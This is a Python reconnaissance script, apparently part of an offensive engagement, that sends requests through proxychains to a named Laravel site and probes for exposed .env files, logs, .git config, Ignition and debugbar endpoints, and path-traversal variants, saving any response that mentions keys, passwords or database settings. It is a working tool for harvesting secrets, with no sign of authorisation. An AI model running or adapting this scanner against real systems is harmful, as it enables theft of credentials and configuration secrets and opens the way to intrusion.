#!/usr/bin/env python3
"""TASK 2: Laravel .env / Debug"""
import subprocess, time, json, sys, os

BASE = "https://ifes25-semproxy.selecao.net.br"
OUT = "/home/ubuntu/engagement/cotec-fadenor.selecao.net.br/enum/env_debug.txt"
SLEEP = 1.2

def curl(url, method="GET", headers=None):
    cmd = ["proxychains4", "-q", "curl", "-sk", "--max-time", "10", "-i"]
    if method == "POST":
        cmd += ["-X", "POST"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    cmd += [url]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout

results = []

print("=== TASK 2: Laravel .env / Debug ===")

# .env files
env_paths = [
    "/.env", "/admin/.env", "/.env.backup", "/.env.bak", "/.env.local",
    "/.env.production", "/.env.development", "/.env.example",
    "/composer.json", "/package.json",
    "/artisan", "/server.php",
    "/storage/logs/laravel.log", "/storage/logs/laravel-2025-01-01.log",
    "/storage/logs/laravel-2024-01-01.log",
    "/storage/logs/laravel-*.log",
    "/../.env", "/%2e%2e/.env",
    "/admin/login/?APP_DEBUG=true&APP_ENV=local&XDEBUG_SESSION=1",
    "/admin/login/?__debug__", "/admin/login/?debug=1",
    "/admin/login/_ignition/", "/_ignition/health-check",
    "/_ignition/", "/_ignition/execute-solution",
    "/debug", "/debugbar", "/_debugbar",
    "/.git/config", "/.git/HEAD",
    "/config/app.php", "/config/database.php",
    "/app/config/app.php",
]

for path in env_paths:
    url = BASE + path
    print(f"[>] Testing: {url}")
    r = curl(url)
    time.sleep(SLEEP)
    status = "UNKNOWN"
    for line in r.split('\n'):
        if line.startswith("HTTP/"):
            status = line.strip()
    body = r.split('\n\n', 1)[1] if '\n\n' in r else r
    body_len = len(body)
    interesting = False
    details = ""
    if any(x in body.lower() for x in ["app_key", "db_", "password", "secret", 
                                        "database", "mysql", "redis", "mail_",
                                        "laravel", "log", "error", "exception",
                                        "whoops", "ignition", "debug"]):
        interesting = True
        details = "[INTERESTING CONTENT]"
    if "200" in status or "404" not in status:
        interesting = True
        details = "[NON-404 RESPONSE]"
    results.append(f"{path} -> {status} | body_len={body_len} {details}")
    if interesting and "200" in status:
        # Save body for analysis
        safe_name = path.replace('/', '_').replace('?', '_').replace('=', '_')
        save_path = f"/home/ubuntu/engagement/cotec-fadenor.selecao.net.br/enum/resp_{safe_name}.txt"
        with open(save_path, 'w') as f:
            f.write(r)

with open(OUT, 'w') as f:
    f.write("=== LARAVEL .env / DEBUG ===\n")
    f.write(f"Target: {BASE}\n\n")
    for line in results:
        f.write(line + "\n")

print(f"\n[+] Results saved to {OUT}")